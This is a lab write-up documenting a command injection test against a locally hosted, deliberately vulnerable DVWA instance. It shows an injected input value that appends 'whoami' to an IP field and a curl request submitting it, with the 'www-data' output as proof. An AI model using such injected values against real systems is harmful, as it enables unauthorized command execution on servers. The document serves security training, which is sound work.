# Methodology – DVWA Command Injection

## 1. Objective

The objective of this lab was to identify and validate a **Command Injection vulnerability** in DVWA and document the attack in a controlled local environment.

The testing focused on determining whether user-controlled input could be manipulated to execute an additional operating system command.

---

## 2. Scope

Testing was limited to the locally hosted DVWA application.

| Item                | Details                       |
| ------------------- | ----------------------------- |
| Target              | DVWA                          |
| URL                 | `http://localhost:8080/DVWA/` |
| Vulnerable Function | Command Injection             |
| Endpoint            | `/DVWA/vulnerabilities/exec/` |
| Security Level      | Low                           |
| Testing Type        | Controlled Local Lab          |

---

## 3. Testing Methodology

### Step 1 – Identify the Input

The Command Injection page was inspected to identify user-controlled parameters.

The application provides an IP address input field:

```text
ip
```

---

### Step 2 – Establish Baseline Behavior

A normal IP address was submitted:

```text
127.0.0.1
```

This established the expected behavior of the application before testing for command injection.

---

### Step 3 – Test Input Manipulation

A controlled command separator was added to the input:

```text
127.0.0.1; whoami
```

The purpose was to determine whether the application would interpret the additional command as an operating system command.

---

### Step 4 – Verify Command Execution

The request was also tested using `curl`:

```bash
curl -s \
  -H 'Cookie: PHPSESSID=<LAB_SESSION_ID>; security=low' \
  -d 'ip=127.0.0.1; whoami&Submit=Submit' \
  "http://localhost:8080/DVWA/vulnerabilities/exec/"
```

The response contained:

```text
www-data
```

This confirmed that the injected command was executed by the web application.

---

## 4. Evidence Collection

Three screenshots were collected during the assessment:

```text
screenshots/
├── 01-dvwa-command-injection.png.png
├── 02-network-evidence.png.png
└── 03-curl-result.png.png
```

### Evidence 1

```markdown
![DVWA Command Injection](screenshots/01-dvwa-command-injection.png.png)
```

### Evidence 2

```markdown
![Network Evidence](screenshots/02-network-evidence.png.png)
```

### Evidence 3

```markdown
![Curl Command Injection Result](screenshots/03-curl-result.png.png)
```

---

## 5. Validation

The vulnerability was considered **confirmed** because the injected `whoami` command produced the following output:

```text
www-data
```

This demonstrates that user-controlled input was successfully used to execute an additional operating system command.

---

## 6. Safety and Authorization

All testing was performed against a deliberately vulnerable DVWA instance hosted in a controlled local laboratory environment.

No unauthorized external systems were targeted.
